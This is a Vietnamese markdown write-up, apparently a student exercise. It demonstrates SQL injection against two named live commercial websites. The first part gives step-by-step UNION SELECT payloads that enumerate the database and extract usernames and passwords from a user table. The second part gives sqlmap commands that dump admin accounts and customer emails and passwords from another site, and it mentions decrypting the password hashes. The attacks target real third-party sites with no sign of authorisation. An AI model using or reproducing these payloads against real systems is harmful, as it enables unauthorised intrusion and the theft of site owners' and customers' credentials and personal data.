# Thực hiện khai thác lỗ hổng trang web trên SQL injection
###### Test trên web "In Thiếp cưới"  `https://thanhnha.com/?php=product_detail&cat=201&id=288`
###### Để tìm xem trang web này có bị lỗi SQL injection ko. Thực hiện thêm `'` vào sau `id`
###### `/?php=product_detail&cat=201&id=288'`
###### ==> Nhận thấy lỗi không show ra image và information của sản phẩm.
![alt text](image.png)
### Tìm kiếm số `col` của trang web
###### Bằng lệnh `GET /?php=product_detail&cat=201&id=288' ORDER BY 18-- - HTTP/2` thì xảy ra lỗi 
###### Câu lệnh được mã hóa trong Burp suite `GET /?php=product_detail&cat=201 id=288%20ORDER%20BY%2017--%20-`
![alt text](image-1.png)
###### Còn khi giảm xuống `ORDER BY 17-- -` thì không xuất hiện lỗi.
###### ===> Có 17 cột. 
![alt text](image-2.png)
### Tìm các cột hợp lý để nhúng code.
###### Bằng lệnh `https://thanhnha.com/?php=product_detail&cat=201&id=-288 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17-- -`
![alt text](image-3.png)
###### Câu lệnh mã hõa trong Burp
![alt text](image-4.png)
###### ===> 3 và 6 là cột để có thể chèn code vào đó.Em chọn cột 6 để chèn code vào vì lý do không gian để chứa thông tin in ra nhiều.
### Tìm kiế USER 
##### bằng câu lệnh `https://thanhnha.com/?php=product_detail&cat=201&id=-288 UNION SELECT 1,2,3,4,5,user(),7,8,9,10,11,12,13,14,15,16,17-- -` có thể xem được người dùng.
![alt text](image-6.png)
###### Câu lệnh mã hóa trong burp suite
![alt text](image-5.png)
###### ===> Tìm ra tên người dùng `thanhnhaco_binh@localhost`
### Tìm kiếm tên database.
###### Sử dụng lệnh để tìm kiếm tên database của trang web `https://thanhnha.com/?php=product_detail&cat=201&id=-288 UNION SELECT 1,2,3,4,5,database(),7,8,9,10,11,12,13,14,15,16,17-- -` là `thanhnhaco_binh `
![alt text](image-7.png)
### Tìm kiếm version mà trnag web đang sử dụng.
##### Thực hiện nhập lệnh `https://thanhnha.com/?php=product_detail&cat=201&id=-288 UNION SELECT 1,2,3,4,5,version(),7,8,9,10,11,12,13,14,15,16,17-- -`
###### ===> kết quả ccho thấy version mà trang web đang sử dụng là `10.6.19-MariaDB `
![alt text](image-8.png)
### Tìm kiếm tên bảng mà SQL sử dụng.
###### Bằng lệnh `https://thanhnha.com/?php=product_detail&cat=201&id=-288 UNION SELECT 1,2,3,4,5,group_concat(unhex(hex(table_name))),7,8,9,10,11,12,13,14,15,16,17 from information_schema.tables where table_schema=database()-- -` chúng ta thấy được tên bẳng như sau.
![alt text](image-9.png)
### Tìm kiếm thông tin bảng vừa tìm được.
###### Tìm kiếm thông tin của bảng `tbl_user` bằng lệnh `https://thanhnha.com/?php=product_detail&cat=201&id=-288 UNION SELECT 1,2,3,4,5,group_concat(unhex(hex(column_name))),7,8,9,10,11,12,13,14,15,16,17 from information_schema.columns where table_schema=database() and table_name='tbl_user'-- -`
###### ===> kết quả tìm thấy dữ liệu như hình dưới đây.
![alt text](image-10.png)
### Lấy userName và PassWork người dùng.
###### Bằng lệnh `https://thanhnha.com/?php=product_detail&cat=201&id=-288 UNION SELECT 1,2,uid,4,5,pwd,7,8,9,10,11,12,13,14,15,16,17 from tbl_user-- -`
###### Tìm thấy kết quả username và password.
![alt text](image-11.png)
### Lấy ra tài khoản mà mật khẩu khác.
###### Bằng cách nhập lệnh `https://thanhnha.com/?php=product_detail&cat=201&id=-288 UNION SELECT 1,2,uid,4,5,pwd,7,8,9,10,11,12,13,14,15,16,17 from tbl_user limit 1,1-- -`
![alt text](image-12.png)




###### Lấy tài khoản admin của một web site khác.
![alt text](image-20.png)
###### Sau khi chạy sqlmap để kiểm tra thì phát hiện web này mắc lỗi sql injection.
###### Kiểm tra trang web này ta thấy rằng database được tạo bằng MySQL.
![alt text](image-21.png)
![alt text](image-22.png)
![alt text](image-23.png)
![alt text](image-24.png)
![alt text](image-25.png)
![alt text](image-26.png)
###### Ta thấy mk đã bi mã hóa ta tiến hành giải mã.
![alt text](image-27.png)
###### Lấy tài khoản người dùng.
![alt text](image-28.png)
![alt text](image-29.png)
![alt text](image-30.png)
![alt text](image-31.png)
![alt text](image-32.png)

###### `sqlmap.py -u "https://2fly.com.vn/shop.php?id=12" --dbs`
![alt text](image-33.png)
###### `sqlmap.py -u "https://2fly.com.vn/shop.php?id=12" -D fly11308_2fly --tables`
![alt text](image-34.png)
![alt text](image-35.png)
###### `sqlmap.py -u "https://2fly.com.vn/shop.php?id=12" -D fly11308_2fly -T account --columns`
![alt text](image-36.png)
![alt text](image-37.png)
###### `sqlmap.py -u "https://2fly.com.vn/shop.php?id=12" -D fly11308_2fly -T account -C username,password --dump`
![alt text](image-38.png)
###### `sqlmap.py -u "https://2fly.com.vn/shop.php?id=12" -D fly11308_2fly -T khachhang --columns`
![alt text](image-39.png)
![alt text](image-40.png)
###### `sqlmap.py -u "https://2fly.com.vn/shop.php?id=12" -D fly11308_2fly -T khachhang -C email,id,matkhau --dump`
![alt text](image-41.png)
![alt text](image-42.png)
![alt text](image-43.png)
![alt text](image-44.png)